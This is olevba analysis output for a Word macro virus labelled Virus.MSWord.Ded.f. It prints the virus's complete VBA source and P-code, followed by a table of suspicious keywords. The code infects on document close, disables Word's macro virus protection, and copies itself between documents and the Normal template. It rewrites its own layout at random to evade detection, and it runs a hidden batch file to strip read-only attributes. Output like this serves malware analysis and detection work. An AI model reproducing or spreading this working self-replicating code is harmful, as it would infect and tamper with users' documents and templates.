olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub _
Document_New()

        End Sub
'9.637774
          Private _
Sub Document_Close()

           On _
Error GoTo skam

  Options. _
              VirusProtection = False

          SWL
'33.61163
     ABS99
'42.56033
skam:
'8.957314
           End Sub
'72.16117
      Private Sub SWL()
'42.59714
     Application. _
                          ShowVisualBasicEditor = False

              If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

    d = NormalTemplate. _
VBProject.VBComponents(1).CodeModule.Lines(I, 1)

 If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

            While Mid(d, _
Len(d) - 1, 2) = " _"

      I _
= I + 1

        d = Left(d, Len(d) _
- 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

              Wend
'95.43525
              d = _
e(d)

            ActiveDocument. _
                            VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

    End If
'90.69127
           Next I
'36.27004
       ActiveDocument. _
                                     SaveAs AddToRecentFiles:=False

   End If
'87.02004
End Sub
'90.91909
              Private Sub _
ABS99()

     If Not NormalTemplate. _
 VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 f (NormalTemplate. _
            FullName)

   For I = _
1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

              d = ActiveDocument.VBProject. _
VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 While _
Mid(d, Len(d) - 1, 2) = " _"

            I = _
I + 1

        d = Left(d, _
Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       Wend
'95.04152
        d _
= e(d)

  NormalTemplate.VBProject. _
   VBComponents(1).CodeModule.InsertLines I * 2, d

             End If
'29.928
            Next I
'63.33987
 NormalTemplate. _
   Save

         End If
'4.384488
         End Sub
'4.367179
 Private Function _
e(aString) As String

           aString _
= LTrim(aString)

          aString = RTrim(aString)
'62.57433
 If aString = "Sub " & "Vc()" Then
'53.55306
             aString _
= "Sub " & "ViewVBCode()"

       Else
'98.58498
            If aString = "Sub " & "ViewVBCode()" Then
'60.07596
            aString _
= "Sub " & "Vc()"

 End If
'61.56798
   End _
If

       For _
I = 1 To Len(aString) - 1

         If _
Mid(aString, I, 1) = "." Then

              If Not _
Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

      If Not Mid(aString, I + 1, 1) _
= Chr$(34) Then

    e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

 For _
j = 1 To Int(15 * Rnd)

   e = " " & e
'57.74265
       Next j
'78.44582
Exit _
Function

             End If
'30.3376
            End If
'26.83433
              Else
'31.48093
 If Mid(aString, I, _
1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

If _
Not Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

            e = Left(aString, I - 1) & " _" & _
Chr$(13) & Right(aString, Len(aString) - I)

       For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'10.19003
       Next j
'56.59349
  Exit _
Function

              End _
If

     End _
If

          End _
If

   Next I
'45.99786
       e = _
aString & Chr$(13) & "'" & (100 * Rnd)

    Count = Int(15 * Rnd)
'99.95895
     For j = 1 _
To Count

     e = " " & e
'74.26125
  Next j
'60.429
End _
Function

   Private Sub f(fName)
'99.71515
  If _
GetAttr(fName) And vbReadOnly Then

   Open _
Dir(fName) & ".bat" For Append As #1

     Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

 Print #1, "del " & _
Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

            Close _
#1

  shellResult = _
Shell(Dir(fName) & ".bat", vbHide)

        End If
'47.94405
             End Sub
'60.58485
           Sub Vc()
'51.48963
        For _
aDoc = 1 To Documents.Count

          For _
I = 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

              Documents(aDoc). _
VBProject.VBComponents(1).CodeModule.DeleteLines 1

             Next _
I

             Next aDoc
'22.45269
       For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

         NormalTemplate. _
                                   VBProject.VBComponents(1).CodeModule.DeleteLines 1

           Next I
'21.68937
      Application. _
ShowVisualBasicEditor = True

            End _
Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9817 bytes
' Line #0:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' Line #2:
' 	EndSub 
' Line #3:
' 	QuoteRem 0x0000 0x0008 "9.637774"
' Line #4:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' Line #6:
' 	LineCont 0x0004 01 00 00 00
' 	OnError skam 
' Line #7:
' Line #8:
' 	LineCont 0x0004 02 00 0E 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	ArgsCall SWL 0x0000 
' Line #11:
' 	QuoteRem 0x0000 0x0008 "33.61163"
' Line #12:
' 	ArgsCall ABS99 0x0000 
' Line #13:
' 	QuoteRem 0x0000 0x0008 "42.56033"
' Line #14:
' 	Label skam 
' Line #15:
' 	QuoteRem 0x0000 0x0008 "8.957314"
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0008 "72.16117"
' Line #18:
' 	FuncDefn (Private Sub SWL())
' Line #19:
' 	QuoteRem 0x0000 0x0008 "42.59714"
' Line #20:
' 	LineCont 0x0004 02 00 1A 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #21:
' Line #22:
' 	LineCont 0x0004 02 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #23:
' Line #24:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' Line #26:
' 	LineCont 0x0004 04 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #27:
' Line #28:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #29:
' Line #30:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #31:
' Line #32:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #33:
' Line #34:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #35:
' Line #36:
' 	Wend 
' Line #37:
' 	QuoteRem 0x0000 0x0008 "95.43525"
' Line #38:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #39:
' Line #40:
' 	LineCont 0x0004 02 00 1C 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x0008 "90.69127"
' Line #44:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	QuoteRem 0x0000 0x0008 "36.27004"
' Line #46:
' 	LineCont 0x0004 02 00 25 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #47:
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	QuoteRem 0x0000 0x0008 "87.02004"
' Line #50:
' 	EndSub 
' Line #51:
' 	QuoteRem 0x0000 0x0008 "90.91909"
' Line #52:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub ABS99())
' Line #53:
' Line #54:
' 	LineCont 0x0004 04 00 01 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #55:
' Line #56:
' 	LineCont 0x0004 04 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #57:
' Line #58:
' 	LineCont 0x0004 03 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #59:
' Line #60:
' 	LineCont 0x0004 06 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #61:
' Line #62:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #63:
' Line #64:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #65:
' Line #66:
' 	LineCont 0x0004 02 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #67:
' Line #68:
' 	LineCont 0x0004 06 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #69:
' Line #70:
' 	Wend 
' Line #71:
' 	QuoteRem 0x0000 0x0008 "95.04152"
' Line #72:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #73:
' Line #74:
' 	LineCont 0x0004 04 00 03 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #75:
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	QuoteRem 0x0000 0x0006 "29.928"
' Line #78:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	QuoteRem 0x0000 0x0008 "63.33987"
' Line #80:
' 	LineCont 0x0004 02 00 03 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #81:
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	QuoteRem 0x0000 0x0008 "4.384488"
' Line #84:
' 	EndSub 
' Line #85:
' 	QuoteRem 0x0000 0x0008 "4.367179"
' Line #86:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #87:
' Line #88:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #89:
' Line #90:
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #91:
' 	QuoteRem 0x0000 0x0008 "62.57433"
' Line #92:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #93:
' 	QuoteRem 0x0000 0x0008 "53.55306"
' Line #94:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #95:
' Line #96:
' 	ElseBlock 
' Line #97:
' 	QuoteRem 0x0000 0x0008 "98.58498"
' Line #98:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	QuoteRem 0x0000 0x0008 "60.07596"
' Line #100:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #101:
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	QuoteRem 0x0000 0x0008 "61.56798"
' Line #104:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #105:
' Line #106:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #107:
' Line #108:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #109:
' Line #110:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #111:
' Line #112:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #113:
' Line #114:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #115:
' Line #116:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #117:
' Line #118:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #119:
' 	QuoteRem 0x0000 0x0008 "57.74265"
' Line #120:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	QuoteRem 0x0000 0x0008 "78.44582"
' Line #122:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #123:
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	QuoteRem 0x0000 0x0007 "30.3376"
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	QuoteRem 0x0000 0x0008 "26.83433"
' Line #128:
' 	ElseBlock 
' Line #129:
' 	QuoteRem 0x0000 0x0008 "31.48093"
' Line #130:
' 	LineCont 0x0004 07 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #133:
' Line #134:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #135:
' Line #136:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #137:
' Line #138:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #139:
' 	QuoteRem 0x0000 0x0008 "10.19003"
' Line #140:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	QuoteRem 0x0000 0x0008 "56.59349"
' Line #142:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #143:
' Line #144:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #145:
' Line #146:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #147:
' Line #148:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #149:
' Line #150:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	QuoteRem 0x0000 0x0008 "45.99786"
' Line #152:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #153:
' Line #154:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #155:
' 	QuoteRem 0x0000 0x0008 "99.95895"
' Line #156:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #157:
' Line #158:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #159:
' 	QuoteRem 0x0000 0x0008 "74.26125"
' Line #160:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' 	QuoteRem 0x0000 0x0006 "60.429"
' Line #162:
' 	LineCont 0x0004 01 00 00 00
' 	EndFunc 
' Line #163:
' Line #164:
' 	FuncDefn (Private Sub False(fName))
' Line #165:
' 	QuoteRem 0x0000 0x0008 "99.71515"
' Line #166:
' 	LineCont 0x0004 01 00 00 00
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #167:
' Line #168:
' 	LineCont 0x0004 01 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #169:
' Line #170:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #171:
' Line #172:
' 	LineCont 0x0004 06 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #173:
' Line #174:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #175:
' Line #176:
' 	LineCont 0x0004 02 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #177:
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	QuoteRem 0x0000 0x0008 "47.94405"
' Line #180:
' 	EndSub 
' Line #181:
' 	QuoteRem 0x0000 0x0008 "60.58485"
' Line #182:
' 	FuncDefn (Sub Vc())
' Line #183:
' 	QuoteRem 0x0000 0x0008 "51.48963"
' Line #184:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #185:
' Line #186:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #187:
' Line #188:
' 	LineCont 0x0004 05 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #189:
' Line #190:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' Line #192:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #193:
' 	QuoteRem 0x0000 0x0008 "22.45269"
' Line #194:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #195:
' Line #196:
' 	LineCont 0x0004 02 00 23 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #197:
' Line #198:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #199:
' 	QuoteRem 0x0000 0x0008 "21.68937"
' Line #200:
' 	LineCont 0x0004 02 00 00 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #201:
' Line #202:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #203:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

